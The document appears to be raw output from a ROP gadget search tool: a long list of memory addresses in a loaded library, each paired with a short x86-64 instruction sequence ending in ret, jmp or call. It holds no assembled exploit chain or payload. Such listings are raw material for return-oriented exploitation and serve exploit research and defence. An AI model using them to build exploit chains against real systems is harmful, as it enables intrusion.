0x00002aaaaab91cbd : add byte ptr [rax], al ; add byte ptr [rcx - 0x7f], cl ; ret
0x00002aaaaabf59c7 : add byte ptr [rax], al ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaac6872d : add byte ptr [rax], al ; add byte ptr [rcx - 0xd], bl ; clc ; ret 0x6e1f
0x00002aaaaab63060 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 1
0x00002aaaaab63086 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 2
0x00002aaaaac1055d : add byte ptr [rax], al ; add byte ptr [rcx], al ; push rdi ; sub byte ptr [rax + 1], bh ; ret
0x00002aaaaaba9fb5 : add byte ptr [rax], al ; add byte ptr [rcx], al ; setg dl ; jmp 0xd4f46
0x00002aaaaab8e245 : add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret
0x00002aaaaabaf662 : add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8d0f
0x00002aaaaabb4be5 : add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x8f0f
0x00002aaaaabaf4fb : add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaab61e44 : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret
0x00002aaaaab96cbf : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0x2941
0x00002aaaaab9a431 : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0x748d
0x00002aaaaab9864d : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0x8d41
0x00002aaaaab96c82 : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xbe0f
0x00002aaaaac1ec3b : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xca39
0x00002aaaaab2901a : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xd089
0x00002aaaaab9ab7d : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xd129
0x00002aaaaab968ae : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xd629
0x00002aaaaab9a3a1 : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xf889
0x00002aaaaabd113f : add byte ptr [rax], al ; add byte ptr [rcx], ch ; sal bl, 1 ; ret
0x00002aaaaabb4b4d : add byte ptr [rax], al ; add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaab8f9b5 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r14 ; ret
0x00002aaaaab0f26a : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab02f2d : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rol byte ptr [rbx - 0x6bf07f19], 0xc0 ; ret
0x00002aaaaab82955 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; ror byte ptr [rax + 1], cl ; ret 0xe974
0x00002aaaaab4f38d : add byte ptr [rax], al ; add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x7a3aa ; ret
0x00002aaaaab0f089 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac83c61 : add byte ptr [rax], al ; add byte ptr [rdi + 0x1c480001], ch ; cmc ; call qword ptr [rdx]
0x00002aaaaac2d358 : add byte ptr [rax], al ; add byte ptr [rdi + 0x63], cl ; or al, 0x8b ; add r9, r11 ; jmp r9
0x00002aaaaab800b2 : add byte ptr [rax], al ; add byte ptr [rdi + 2], bh ; neg eax ; ret
0x00002aaaaac46d42 : add byte ptr [rax], al ; add byte ptr [rdi + 9], bh ; neg eax ; ret
0x00002aaaaac7c641 : add byte ptr [rax], al ; add byte ptr [rdi + rax*8], cl ; add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaac86ef1 : add byte ptr [rax], al ; add byte ptr [rdi + rbp*2 + 0x18f80001], bh ; stc ; jmp qword ptr [rsi]
0x00002aaaaac86ec1 : add byte ptr [rax], al ; add byte ptr [rdi + rbp*2 + 0x18f80001], cl ; stc ; jmp qword ptr [rsi]
0x00002aaaaac86e49 : add byte ptr [rax], al ; add byte ptr [rdi + rbp*2], dl ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7aef1 : add byte ptr [rax], al ; add byte ptr [rdi + rbp*4 - 0x780000], bh ; stc ; call qword ptr [rax]
0x00002aaaaac82e59 : add byte ptr [rax], al ; add byte ptr [rdi + rbp], ah ; add dword ptr [rax], eax ; jo 0x1ade4b ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e71 : add byte ptr [rax], al ; add byte ptr [rdi + rbp], bh ; add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac82e41 : add byte ptr [rax], al ; add byte ptr [rdi + rbp], cl ; add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac81ee1 : add byte ptr [rax], al ; add byte ptr [rdi + rbx - 0x6ce7ffff], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7dec1 : add byte ptr [rax], al ; add byte ptr [rdi + rbx*8 - 0x6a480000], cl ; int1 ; call qword ptr [rax]
0x00002aaaaac7ded9 : add byte ptr [rax], al ; add byte ptr [rdi + rbx*8 - 0x6a500000], ah ; int1 ; call qword ptr [rax]
0x00002aaaaac7de41 : add byte ptr [rax], al ; add byte ptr [rdi + rbx*8], cl ; add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaac84ec9 : add byte ptr [rax], al ; add byte ptr [rdi + rcx*2 + 0x6fe00001], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84ee1 : add byte ptr [rax], al ; add byte ptr [rdi + rcx*2 + 0x6ff80001], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74e59 : add byte ptr [rax], al ; add byte ptr [rdi + rcx*2], ah ; add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe6d
0x00002aaaaac84e39 : add byte ptr [rax], al ; add byte ptr [rdi + rcx*2], al ; add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84e51 : add byte ptr [rax], al ; add byte ptr [rdi + rcx*2], bl ; add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac8be91 : add byte ptr [rax], al ; add byte ptr [rdi + rdi*4 + 1], bl ; add byte ptr [rax], cl ; push 0xf7 ; jmp rsi
0x00002aaaaac83e49 : add byte ptr [rax], al ; add byte ptr [rdi + rdi], dl ; add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaac79659 : add byte ptr [rax], al ; add byte ptr [rdi + rdx*4], ah ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac7f681 : add byte ptr [rax], al ; add byte ptr [rdi + rsi*8], cl ; add byte ptr [rax + 0x2c], cl ; jmp rcx
0x00002aaaaac73639 : add byte ptr [rax], al ; add byte ptr [rdi + rsi], al ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac73669 : add byte ptr [rax], al ; add byte ptr [rdi + rsi], dh ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac7e6f1 : add byte ptr [rax], al ; add byte ptr [rdi - 0x10d80000], bh ; int1 ; jmp rcx
0x00002aaaaabbc648 : add byte ptr [rax], al ; add byte ptr [rdi - 0xa], dh ; ret
0x00002aaaaac77c59 : add byte ptr [rax], al ; add byte ptr [rdi*2 + 0x4b900000], ah ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac91a32 : add byte ptr [rax], al ; add byte ptr [rdi], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 7
0x00002aaaaab09dce : add byte ptr [rax], al ; add byte ptr [rdi], bh ; movd xmm0, eax ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac82651 : add byte ptr [rax], al ; add byte ptr [rdi], bl ; add dword ptr [rax], eax ; js 0x1ad60c ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabe9dc5 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x89c78944 ; ret
0x00002aaaaac2ecd4 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x00002aaaaab7efe5 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x00002aaaaac2fd0d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x00002aaaaac2fd7d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x00002aaaaaafac55 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaaba5d3d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4b ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab41e25 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x53 ; or al, 0xf6 ; ret 0xf04
0x00002aaaaab5f58d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaab4f61d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x00002aaaaac4286d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaab7353d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab7354d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dh ; ret
0x00002aaaaab7352d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaab7308d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esi, 0x74c08407 ; and al, 0x39 ; ret 0x2574
0x00002aaaaab72f4d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esi, 0x74c08407 ; sub edi, dword ptr [rcx] ; ret 0x2774
0x00002aaaaab6ab5d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x00002aaaaab62f9d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab62f8d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaab62f7d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x00002aaaaab99734 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret
0x00002aaaaab99a4e : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x144
0x00002aaaaac1185b : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x3145
0x00002aaaaab90af5 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x3bba
0x00002aaaaaaff84e : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x4389
0x00002aaaaabb357a : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x833b
0x00002aaaaab1a6ac : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x8539
0x00002aaaaac16f6c : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x8941
0x00002aaaaabcfc98 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x90c3
0x00002aaaaabbf358 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xa6e9
0x00002aaaaab8a93c : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc3f3
0x00002aaaaababcbe : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc689
0x00002aaaaab9799f : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xd801
0x00002aaaaabb4b3b : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x8488
0x00002aaaaac1eb85 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, edx ; ret 0xf40
0x00002aaaaab36a3d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabad2cc : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0x4422
0x00002aaaaac82669 : add byte ptr [rax], al ; add byte ptr [rdi], dh ; add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac3f3fd : add byte ptr [rax], al ; add byte ptr [rdx + 0x48028801], cl ; lea eax, dword ptr [rdx] ; ret
0x00002aaaaac3b0cd : add byte ptr [rax], al ; add byte ptr [rdx + 0x48028801], cl ; mov eax, edi ; ret
0x00002aaaaab7c59d : add byte ptr [rax], al ; add byte ptr [rdx + 0x48178816], cl ; lea eax, dword ptr [rdi + 1] ; ret
0x00002aaaaac81449 : add byte ptr [rax], al ; add byte ptr [rdx + 0xd500001], dl ; hlt ; jmp rcx
0x00002aaaaaade205 : add byte ptr [rax], al ; add byte ptr [rdx + 1], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac801b9 : add byte ptr [rax], al ; add byte ptr [rdx + rax - 0x1abfffff], al ; call qword ptr [rsi]
0x00002aaaaac781f1 : add byte ptr [rax], al ; add byte ptr [rdx + rax*4 + 0x59680000], bh ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac7c151 : add byte ptr [rax], al ; add byte ptr [rdx + rax*8], bl ; add byte ptr [rax], al ; call 0x281a6b90
0x00002aaaaac7c169 : add byte ptr [rax], al ; add byte ptr [rdx + rax*8], dh ; add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaac7e981 : add byte ptr [rax], al ; add byte ptr [rdx + rbp*8], cl ; add byte ptr [rax - 7], bh ; int1 ; call rsi
0x00002aaaaac72991 : add byte ptr [rax], al ; add byte ptr [rdx + rbp], bl ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac72961 : add byte ptr [rax], al ; add byte ptr [rdx + rbp], ch ; add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac8d991 : add byte ptr [rax], al ; add byte ptr [rdx + rbx*8 + 1], bl ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaac71949 : add byte ptr [rax], al ; add byte ptr [rdx + rbx], dl ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac76ec1 : add byte ptr [rax], al ; add byte ptr [rdx + rbx], dl ; add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac849b9 : add byte ptr [rax], al ; add byte ptr [rdx + rcx*2 + 0x5b200001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac849e9 : add byte ptr [rax], al ; add byte ptr [rdx + rcx*2 + 0x5b500001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84971 : add byte ptr [rax], al ; add byte ptr [rdx + rcx*2], bh ; add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac789a1 : add byte ptr [rax], al ; add byte ptr [rdx + rcx*4], ch ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac7b989 : add byte ptr [rax], al ; add byte ptr [rdx + rdi*4], dl ; add byte ptr [rax + 0x73], dh ; out dx, eax ; call rax
0x00002aaaaac8f989 : add byte ptr [rax], al ; add byte ptr [rdx + rdi*8 + 1], dl ; add byte ptr [rax + 0x47], ah ; clc ; call qword ptr [rbx]
0x00002aaaaac811a1 : add byte ptr [rax], al ; add byte ptr [rdx + rdx + 1], ch ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac811e9 : add byte ptr [rax], al ; add byte ptr [rdx + rdx - 0x25dfffff], dh ; jmp qword ptr [rcx]
0x00002aaaaac811d1 : add byte ptr [rax], al ; add byte ptr [rdx + rdx - 0x25f7ffff], bl ; jmp qword ptr [rcx]
0x00002aaaaac811b9 : add byte ptr [rax], al ; add byte ptr [rdx + rdx - 0x260fffff], al ; jmp qword ptr [rcx]
0x00002aaaaac851c9 : add byte ptr [rax], al ; add byte ptr [rdx + rdx*2 + 0x73f00001], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac851b1 : add byte ptr [rax], al ; add byte ptr [rdx + rdx*2 + 1], bh ; add al, bl ; jae 0x1b01ba ; jmp qword ptr [rcx]
0x00002aaaaac85181 : add byte ptr [rax], al ; add byte ptr [rdx + rdx*2 + 1], cl ; add byte ptr [rax + 0x73], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85151 : add byte ptr [rax], al ; add byte ptr [rdx + rdx*2], bl ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac79179 : add byte ptr [rax], al ; add byte ptr [rdx + rdx*4], al ; add al, al ; add bh, ch ; jmp rsp
0x00002aaaaac81161 : add byte ptr [rax], al ; add byte ptr [rdx + rdx], ch ; add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaac831a1 : add byte ptr [rax], al ; add byte ptr [rdx + rsi + 1], ch ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac831f1 : add byte ptr [rax], al ; add byte ptr [rdx + rsi - 0x1877ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f1c1 : add byte ptr [rax], al ; add byte ptr [rdx + rsi*8 + 0x19f80000], cl ; jmp qword ptr [rcx]
0x00002aaaaac7f49e : add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83141 : add byte ptr [rax], al ; add byte ptr [rdx + rsi], cl ; add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaac82b86 : add byte ptr [rax], al ; add byte ptr [rdx], al ; or dword ptr [rsi], 0x54028310 ; ret
0x00002aaaaac1ea43 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp ah, byte ptr [rbx - 0x35] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xf40
0x00002aaaaac42b62 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab09b2d : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; sub cl, al ; add rsp, 0x28 ; ret
0x00002aaaaab62e92 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x00002aaaaaaddfc5 : add byte ptr [rax], al ; add byte ptr [rsi + 1], ah ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaabd7aa3 : add byte ptr [rax], al ; add byte ptr [rsi + 1], bh ; call rbx
0x00002aaaaabd7c90 : add byte ptr [rax], al ; add byte ptr [rsi + 1], bh ; mov rdi, r12 ; call rbx
0x00002aaaaabd7b5c : add byte ptr [rax], al ; add byte ptr [rsi + 1], bh ; mov rdi, r13 ; call rbx
0x00002aaaaabd7ad4 : add byte ptr [rax], al ; add byte ptr [rsi + 1], bh ; mov rdi, r14 ; call rbx
0x00002aaaaac8e5a1 : add byte ptr [rax], al ; add byte ptr [rsi + 1], ch ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaaadb99d : add byte ptr [rax], al ; add byte ptr [rsi + 1], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac825a9 : add byte ptr [rax], al ; add byte ptr [rsi + 1], dh ; add al, dl ; cmpsd dword ptr [rsi], dword ptr [rdi] ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabd7f0e : add byte ptr [rax], al ; add byte ptr [rsi + 2], bh ; mov rdi, r12 ; call rbx
0x00002aaaaabd7c81 : add byte ptr [rax], al ; add byte ptr [rsi + 2], bh ; mov rdi, r13 ; call rbx
0x00002aaaaabd7b4d : add byte ptr [rax], al ; add byte ptr [rsi + 2], bh ; mov rdi, r14 ; call rbx
0x00002aaaaabd7ac5 : add byte ptr [rax], al ; add byte ptr [rsi + 2], bh ; mov rdi, r15 ; call rbx
0x00002aaaaabcacf5 : add byte ptr [rax], al ; add byte ptr [rsi + 6], dh ; ret
0x00002aaaaac905b1 : add byte ptr [rax], al ; add byte ptr [rsi + rax + 2], bh ; add byte ptr [rax - 0x79], ch ; sti ; call rcx
0x00002aaaaac7ad79 : add byte ptr [rax], al ; add byte ptr [rsi + rbp*4], al ; add al, ah ; mov dh, ch ; call qword ptr [rsi]
0x00002aaaaac7ada9 : add byte ptr [rax], al ; add byte ptr [rsi + rbp*4], dh ; add al, ah ; mov dh, ch ; jmp rbx
0x00002aaaaac7edd9 : add byte ptr [rax], al ; add byte ptr [rsi + rbp*8 + 0xa300000], ah ; call rsi
0x00002aaaaac71dd1 : add byte ptr [rax], al ; add byte ptr [rsi + rbx + 0x56780000], bl ; jmp 0x1b90e9
0x00002aaaaac81da1 : add byte ptr [rax], al ; add byte ptr [rsi + rbx + 1], ch ; add al, cl ; nop ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81db9 : add byte ptr [rax], al ; add byte ptr [rsi + rbx - 0x6f1fffff], al ; hlt ; call qword ptr [rcx]
0x00002aaaaac85dd9 : add byte ptr [rax], al ; add byte ptr [rsi + rbx*2 - 0x5fcfffff], ah ; cmc ; call rdi
0x00002aaaaac7dd61 : add byte ptr [rax], al ; add byte ptr [rsi + rbx*8], ch ; add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac7dd49 : add byte ptr [rax], al ; add byte ptr [rsi + rbx*8], dl ; add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac8f126 : add byte ptr [rax], al ; add byte ptr [rsi + rcx + 0x10], bl ; add dword ptr [rdx], 0x51 ; ret
0x00002aaaaac84dc1 : add byte ptr [rax], al ; add byte ptr [rsi + rcx*2 + 0x6ea80001], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84dd9 : add byte ptr [rax], al ; add byte ptr [rsi + rcx*2 + 0x6ec00001], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84df1 : add byte ptr [rax], al ; add byte ptr [rsi + rcx*2 + 0x6ed80001], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84d49 : add byte ptr [rax], al ; add byte ptr [rsi + rcx*2], dl ; add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac78da9 : add byte ptr [rax], al ; add byte ptr [rsi + rcx*4], dh ; add al, dl ; mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaac83db9 : add byte ptr [rax], al ; add byte ptr [rsi + rdi + 0x1f100001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83dd1 : add byte ptr [rax], al ; add byte ptr [rsi + rdi + 0x1f280001], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83de9 : add byte ptr [rax], al ; add byte ptr [rsi + rdi + 0x1f400001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac73de9 : add byte ptr [rax], al ; add byte ptr [rsi + rdi + 0x44400000], dh ; cli ; jmp qword ptr [rcx]
0x00002aaaaac7bd49 : add byte ptr [rax], al ; add byte ptr [rsi + rdi*4], dl ; add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac83d59 : add byte ptr [rax], al ; add byte ptr [rsi + rdi], ah ; add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac855d9 : add byte ptr [rax], al ; add byte ptr [rsi + rdx*2 + 0x7b300001], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac855f1 : add byte ptr [rax], al ; add byte ptr [rsi + rdx*2 + 0x7b480001], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85579 : add byte ptr [rax], al ; add byte ptr [rsi + rdx*2 + 1], al ; add al, dl ; jp 0x1b0582 ; jmp qword ptr [rcx]
0x00002aaaaac85591 : add byte ptr [rax], al ; add byte ptr [rsi + rdx*2 + 1], bl ; add al, ch ; jp 0x1b059a ; jmp qword ptr [rcx]
0x00002aaaaac7d5f1 : add byte ptr [rax], al ; add byte ptr [rsi + rdx*8 + 0x1fb80000], bh ; int1 ; call qword ptr [rsi]
0x00002aaaaac8f579 : add byte ptr [rax], al ; add byte ptr [rsi + rsi*8 + 1], al ; add byte ptr [rax], dl ; xchg eax, edi ; sti ; jmp qword ptr [rdx]
0x00002aaaaac7f541 : add byte ptr [rax], al ; add byte ptr [rsi + rsi*8], cl ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac7240e : add byte ptr [rax], al ; add byte ptr [rsi - 0x17], bh ; jmp qword ptr [rsi]
0x00002aaaaac825f1 : add byte ptr [rax], al ; add byte ptr [rsi - 0x57e7ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac825d9 : add byte ptr [rax], al ; add byte ptr [rsi - 0x57ffffff], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab0b86b : add byte ptr [rax], al ; add byte ptr [rsi - 0x70], ah ; mov eax, dword ptr [rip + 0x38c816] ; ret
0x00002aaaaac82541 : add byte ptr [rax], al ; add byte ptr [rsi], cl ; add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac86399 : add byte ptr [rax], al ; add byte ptr [rsp + 1], ah ; add byte ptr [rax - 0x46], dl ; cmc ; call rsi
0x00002aaaaabca367 : add byte ptr [rax], al ; add byte ptr [rsp + rax - 0xd], dh ; ret
0x00002aaaaac803d1 : add byte ptr [rax], al ; add byte ptr [rsp + rax - 0xfe7ffff], bl ; call rcx
0x00002aaaaac90341 : add byte ptr [rax], al ; add byte ptr [rsp + rax], cl ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac7ebb1 : add byte ptr [rax], al ; add byte ptr [rsp + rbp*8], bh ; add byte ptr [rax], cl ; add esi, edx ; call rdi
0x00002aaaaac81be9 : add byte ptr [rax], al ; add byte ptr [rsp + rbx - 0x784fffff], dh ; hlt ; call qword ptr [rax]
0x00002aaaaac84bb9 : add byte ptr [rax], al ; add byte ptr [rsp + rcx*2 + 0x6cd00001], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84bd1 : add byte ptr [rax], al ; add byte ptr [rsp + rcx*2 + 0x6ce80001], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84be9 : add byte ptr [rax], al ; add byte ptr [rsp + rcx*2 + 0x6d000001], dh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84b89 : add byte ptr [rax], al ; add byte ptr [rsp + rcx*2 + 1], dl ; add al, al ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7bb81 : add byte ptr [rax], al ; add byte ptr [rsp + rdi*4], cl ; add al, ch ; frndint ; call qword ptr [rax]
0x00002aaaaac7fbd9 : add byte ptr [rax], al ; add byte ptr [rsp + rdi*8 - 0x59600000], ah ; call rdi
0x00002aaaaac713c1 : add byte ptr [rax], al ; add byte ptr [rsp + rdx + 0x6f680000], cl ; std ; call qword ptr [rcx]
0x00002aaaaac853e1 : add byte ptr [rax], al ; add byte ptr [rsp + rdx*2 + 0x78580001], ch ; cmc ; jmp qword ptr [rbx]
0x00002aaaaac83391 : add byte ptr [rax], al ; add byte ptr [rsp + rsi + 1], bl ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833a9 : add byte ptr [rax], al ; add byte ptr [rsp + rsi + 1], dh ; add byte ptr [rax - 0x14], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833c1 : add byte ptr [rax], al ; add byte ptr [rsp + rsi - 0x1397ffff], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8a3d1 : add byte ptr [rax], al ; add byte ptr [rsp - 0xe57ffff], bl ; sti ; call rcx
0x00002aaaaac7357a : add byte ptr [rax], al ; add byte ptr ss:[rax], al ; or ah, 0xe9 ; call qword ptr [rsi]
0x00002aaaaabb90b5 : add byte ptr [rax], al ; add cl, al ; call 0x66d0c9cd
0x00002aaaaab3c495 : add byte ptr [rax], al ; add cl, ch ; pop rdi ; ret 0xffff
0x00002aaaaab022c5 : add byte ptr [rax], al ; add cl, ch ; ret
